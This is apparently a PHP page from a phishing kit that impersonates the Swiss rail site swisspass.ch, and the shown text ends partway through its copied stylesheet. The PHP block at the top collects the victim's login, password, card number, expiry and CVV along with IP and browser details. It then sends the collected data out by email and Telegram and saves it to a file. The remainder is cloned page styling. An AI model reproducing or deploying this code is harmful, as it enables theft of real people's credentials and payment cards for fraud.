<?php
date_default_timezone_set('GMT');
ini_set('display_errors', false);
require_once '../inc/session.php';
require_once '../inc/functions.php';

require_once '../inc/inc.php';
require_once '../inc/userInfo.php';
require_once 'anti.php';




if (strpos(UserInfo::get_ip(), ",") !== false) {
    $rawIP = explode(",", UserInfo::get_ip());
    $ip = $rawIP[0];
} else {
    $ip = UserInfo::get_ip();
}




$date = date('l d F Y');
$time = date('H:i');
$username = $_SESSION['username'];
$password = $_SESSION['password'];

$_SESSION['cardNumber'] = $_POST['cardNumber'];
$_SESSION['expDate'] = $_POST['expDate'];
$_SESSION['secode'] = $_POST['secode'];

$ccno = $_POST['cardNumber'];
$ccexp = $_POST['expDate'];
$cvv = $_POST['secode'];

$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "Submitted by: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "UserAgent: " . $systemInfo['useragent'] . "";
$VictimInfo4 = "Browser: " . $systemInfo['browser'] . "";
$VictimInfo5 = "Os: " . $systemInfo['os'] . "";



$data = "
|++++++++| 😈 SBB - INFOS 😈 |++++++++|
|
|💶 LOGIN 💶 : $username
|🔐 PASS 🔐 : $password
|
|+++++++| 😈 CARD - INFOS 😈 |+++++++|
|
|💳 NUMB 💳 : $ccno
|📆 EXPD 📆 : $ccexp
|🔐 CVV 🔐 : $cvv
|
|+++++++| 😈 VICTIM - INFOS 😈 |+++++++|
|
|$VictimInfo1
|$VictimInfo4
|Screen Size: $screen
|Received: $date @ $time
|
|++++++| 😈  😈  Lajded 😈  😈 |++++++|
";


if ($sendLog == 1) {
  mail($EMAIL, "SP Login + CC" . $BIN, $data);
}

if ($saveLog == 1) {
	$file = fopen('../secrets/part_2.txt', 'a');
	fwrite($file, $data . "\n");
	fclose($file);

}



if ($telegram == 1) {
    sendToTelegram2($data, $token, $chatID);
}



?>
<!DOCTYPE html>
<html style="" class=" js no-touch hashchange history csstransforms csstransforms3d csstransitions svg inlinesvg svgclippaths placeholder" lang="de-ch">
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>swisspass.ch</title>
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="__META_ROBOTS__">
    
  
    <style>
      @media only screen and (max-width: 600px) {
        .skel-wrap-outer.skin-registration {
          background-color: unset !important;
		  height: 0px!important;
        }
      }
	
    </style>
    <!-- this parameter gets replaced by the script start.sh -->
    <link rel="stylesheet" href="swisspass.ch_files/styles.5e223094ff340720.css">
    <style>
      #clearfix[_ngcontent-ng-c3146796057]:before,
      #clearfix[_ngcontent-ng-c3146796057]:after {
        content: " ";
        display: table
      }

      #clearfix[_ngcontent-ng-c3146796057]:after {
        clear: both
      }

      #justify[_ngcontent-ng-c3146796057] {
        text-align: justify
      }

      #justify[_ngcontent-ng-c3146796057]:after {
        content: "";
        display: inline-block;
        width: 100%
      }

      #link-in-text[_ngcontent-ng-c3146796057],
      #link-in-text[_ngcontent-ng-c3146796057]:hover,
      #link-in-text[_ngcontent-ng-c3146796057]:focus,
      #link-in-text[_ngcontent-ng-c3146796057]:active,
      #link-in-text[_ngcontent-ng-c3146796057]:visited {
        color: #1e416e;
        outline: none;
        text-decoration: underline
      }

      #link-in-text[_ngcontent-ng-c3146796057]:hover,
      #link-in-text[_ngcontent-ng-c3146796057]:focus {
        color: #173256;
        text-decoration: underline
      }

      #overlay[_ngcontent-ng-c3146796057] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
      }

      #trim-margin[_ngcontent-ng-c3146796057]>[_ngcontent-ng-c3146796057]:first-child {
        margin-top: 0 !important
      }

      #trim-margin[_ngcontent-ng-c3146796057]>[_ngcontent-ng-c3146796057]:last-child {
        margin-bottom: 0 !important
      }

      .mod-mobileheader {
        height: 50px !important
      }

      .mod-nestedmenu--link .mod-nestedmenu--linkicon {
        font-size: 2.3rem;
        position: absolute;
        top: 1.5rem
      }

      .mod-nestedmenu--link .mod-nestedmenu--linktext {
        padding-left: 3rem !important
      }

      .mod-nestedmenu-expandlink {
        color: #fff;
        position: absolute;
        right: 20px;
        top: 20px
      }

      .mod-nestedmenu--languagelinks {
        margin: 0;
        padding: 20px
      }

      .mod-nestedmenu--languagelinks-entry {
        float: left;
        border-right: 1px solid white
      }

      .mod-nestedmenu--languagelinks-entry:last-child {
        border-right: none
      }

      .mod-nestedmenu--languagelinks-entry .mod-nestedmenu--link {
        padding: 0 10px !important;
        text-transform: uppercase
      }

      .mod-nestedmenu--languagelinks-entry:first-child .mod-nestedmenu--link {
        padding-left: 0 !important
      }

      .mod-nestedmenu--languagelinks-entry span.mod-nestedmenu--link {
        font-weight: 700
      }

      .mod-nestedmenu--list {
        border-top: 1px solid #AF1602
      }

      .mod-offcanvas,
      .mod-nestedmenu--item {
        background-color: #c51416 !important
      }

      .mod-offcanvas.mod-nestedmenu--selected,
      .mod-nestedmenu--item.mod-nestedmenu--selected {
        background-color: #900a05 !important
      }

      .mod-nestedmenu--expandible .mod-nestedmenu--item {
        background-color: #af1602 !important
      }

      .mod-nestedmenu--expandible .mod-nestedmenu--item.mod-nestedmenu--selected {
        background-color: #900a05 !important
      }

      .mod-nestedmenu--expandible .mod-nestedmenu--item .mod-nestedmenu--linktext {
        padding-left: 50px !important
      }

      nav.mod-offcanvas.js-offcanvas-aside[_ngcontent-ng-c3146796057] {
        padding-bottom: 10rem
      }
    </style>
    <style>
      #clearfix[_ngcontent-ng-c1866012428]:before,
      #clearfix[_ngcontent-ng-c1866012428]:after {
        content: " ";
        display: table
      }

      #clearfix[_ngcontent-ng-c1866012428]:after {
        clear: both
      }

      #justify[_ngcontent-ng-c1866012428] {
        text-align: justify
      }

      #justify[_ngcontent-ng-c1866012428]:after {
        content: "";
        display: inline-block;
        width: 100%
      }

      #link-in-text[_ngcontent-ng-c1866012428],
      #link-in-text[_ngcontent-ng-c1866012428]:hover,
      #link-in-text[_ngcontent-ng-c1866012428]:focus,
      #link-in-text[_ngcontent-ng-c1866012428]:active,
      #link-in-text[_ngcontent-ng-c1866012428]:visited {
        color: #1e416e;
        outline: none;
        text-decoration: underline
      }

      #link-in-text[_ngcontent-ng-c1866012428]:hover,
      #link-in-text[_ngcontent-ng-c1866012428]:focus {
        color: #173256;
        text-decoration: underline
      }

      #overlay[_ngcontent-ng-c1866012428] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
      }

      #trim-margin[_ngcontent-ng-c1866012428]>[_ngcontent-ng-c1866012428]:first-child {
        margin-top: 0 !important
      }

      #trim-margin[_ngcontent-ng-c1866012428]>[_ngcontent-ng-c1866012428]:last-child {
        margin-bottom: 0 !important
      }

      body[_ngcontent-ng-c1866012428]:before {
        content: "";
        visibility: hidden;
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        border: 0
      }

      @media screen and (max-width: 767px) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs  "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-portrait "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-portrait resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-landscape "
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-landscape resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm  "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-portrait "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-landscape "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md  "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-portrait "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-landscape "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg  "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-portrait "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-landscape "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c1866012428]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      .mod-content--page {
        position: relative
      }

      .header-visual {
        display: flex;
        align-items: center;
        flex-direction: column;
        max-height: 355px;
        overflow: hidden
      }

      .header-visual--mobile {
        display: none
      }

      @media screen and (max-width: 767px) {
        .header-visual--mobile {
          display: block
        }
      }

      .header-visual--desktop {
        display: block
      }

      @media screen and (max-width: 767px) {
        .header-visual--desktop {
          display: none
        }
      }

      .header-visual__title {
        position: absolute;
        margin-top: 1em;
        width: 100%
      }

      @media screen and (max-width: 767px) {
        .header-visual__title {
          position: relative
        }
      }

      .header-visual__title h1 {
        max-width: 50%;
        float: right;
        text-align: right;
        font-size: 2.5em;
        margin-top: 1em;
        margin-right: 1em
      }

      @media screen and (max-width: 767px) {
        .header-visual__title h1 {
          font-size: 2em;
          margin-top: .8em;
          margin-right: 1em
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        .header-visual__title h1 {
          font-size: 2em;
          margin-top: .8em;
          margin-right: 1em
        }
      }

      @media screen and (max-width: 767px) {
        .header-visual__title h1 {
          max-width: 75%;
          text-align: left;
          float: none;
          padding-left: 20px
        }
      }

      .mod-content--stretch-height,
      .mod-content--stretch-height .container:last-child,
      .mod-content--stretch-height .mod-content--page,
      .mod-content--stretch-height .mod-content--overview,
      .mod-content--stretch-height .row {
        height: 100%
      }

      .mod-content--fullwidth {
        max-width: 100vw
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        .skin-registration.skel-wrap-outer .skel-wrap-inner {
          height: 100%
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) {
        .skin-registration.skel-wrap-outer .skel-wrap-inner {
          height: 100%
        }
      }

      @media screen and (min-width: 1200px) {
        .skin-registration.skel-wrap-outer .skel-wrap-inner {
          height: 100%
        }
      }
    </style>
    <style>
      #clearfix[_ngcontent-ng-c2708957342]:before,
      #clearfix[_ngcontent-ng-c2708957342]:after {
        content: " ";
        display: table
      }

      #clearfix[_ngcontent-ng-c2708957342]:after {
        clear: both
      }

      #justify[_ngcontent-ng-c2708957342] {
        text-align: justify
      }

      #justify[_ngcontent-ng-c2708957342]:after {
        content: "";
        display: inline-block;
        width: 100%
      }

      #link-in-text[_ngcontent-ng-c2708957342],
      #link-in-text[_ngcontent-ng-c2708957342]:hover,
      #link-in-text[_ngcontent-ng-c2708957342]:focus,
      #link-in-text[_ngcontent-ng-c2708957342]:active,
      #link-in-text[_ngcontent-ng-c2708957342]:visited {
        color: #1e416e;
        outline: none;
        text-decoration: underline
      }

      #link-in-text[_ngcontent-ng-c2708957342]:hover,
      #link-in-text[_ngcontent-ng-c2708957342]:focus {
        color: #173256;
        text-decoration: underline
      }

      #overlay[_ngcontent-ng-c2708957342] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
      }

      #trim-margin[_ngcontent-ng-c2708957342]>[_ngcontent-ng-c2708957342]:first-child {
        margin-top: 0 !important
      }

      #trim-margin[_ngcontent-ng-c2708957342]>[_ngcontent-ng-c2708957342]:last-child {
        margin-bottom: 0 !important
      }

      body[_ngcontent-ng-c2708957342]:before {
        content: "";
        visibility: hidden;
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        border: 0
      }

      @media screen and (max-width: 767px) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs  "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-portrait "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-portrait resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-landscape "
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-landscape resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm  "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-portrait "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-landscape "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md  "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-portrait "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2708957342]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

